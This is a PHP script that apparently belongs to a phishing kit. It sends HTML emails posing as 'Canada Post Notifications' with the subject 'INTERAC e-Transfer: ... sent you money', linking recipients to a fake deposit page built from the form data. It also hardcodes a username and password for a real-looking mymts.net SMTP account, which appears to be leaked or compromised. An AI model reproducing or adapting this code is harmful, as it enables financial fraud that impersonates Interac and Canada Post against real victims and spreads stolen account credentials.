<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require("phpmailer/src/PHPMailer.php");
require("phpmailer/src/SMTP.php");
require("phpmailer/src/Exception.php");

session_start(); // Start the session

try {
    if (isset($_SESSION['form_data'])) {
        // Form data stored in the session
        $form_data = $_SESSION['form_data'];

        // Create placeholders array for replacement in the email template
        $placeholders = array(
            '{{etransfer_interac_ca}}' => $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($form_data),
            '{{line}}' => date('F d, Y', strtotime('+30 days')),
            '{{username}}' => $form_data['recipient-name'], // Replace with the correct session variable
            // Add more placeholders as needed
        );

        $message = file_get_contents('template.html'); // Load the email template
        $message = str_replace(array_keys($placeholders), array_values($placeholders), $message);

        $mail = new PHPMailer(true); // Create a new PHPMailer instance with exceptions enabled
        $mail->IsSMTP();
        $mail->SMTPSecure = 'tls';
        $mail->Host = 'mail.mts.net'; // Use the provided host
        $mail->Port = 587; // The common SMTP port for TLS
        $mail->Body = $message;
        $mail->SMTPAuth = true;
        $mail->Username = 'andallard@mymts.net'; // Use the email address as the username
        $mail->Password = 'Batman123'; // Use the provided password
        $mail->SetFrom('andallard@mymts.net', 'Canada Post Notifications'); // Set From name to "Canada Post"
        $mail->AddAddress($form_data['recipient-email']);
        $mail->Subject = 'INTERAC e-Transfer: ' . $form_data['recipient-name'] . ' sent you money';
        $mail->IsHTML(true);
        $mail->CharSet = "utf-8";

        $mail->send(); // Attempt to send the email

        $_SESSION['email_sent'] = true; // Email sent successfully

        // Redirect to the email status page
        header("Location: email-status.php");
        exit();
    } else {
        // Handle the case where session data is not available
        $_SESSION['email_sent'] = false; // Email sending failed
        header("Location: email-status.php");
        exit();
    }
} catch (Exception $e) {
    // Handle exceptions, log errors, or display error messages
    $_SESSION['email_sent'] = false; // Email sending failed
    echo "Message could not be sent. Mailer Error: " . $e->getMessage();
}
?>
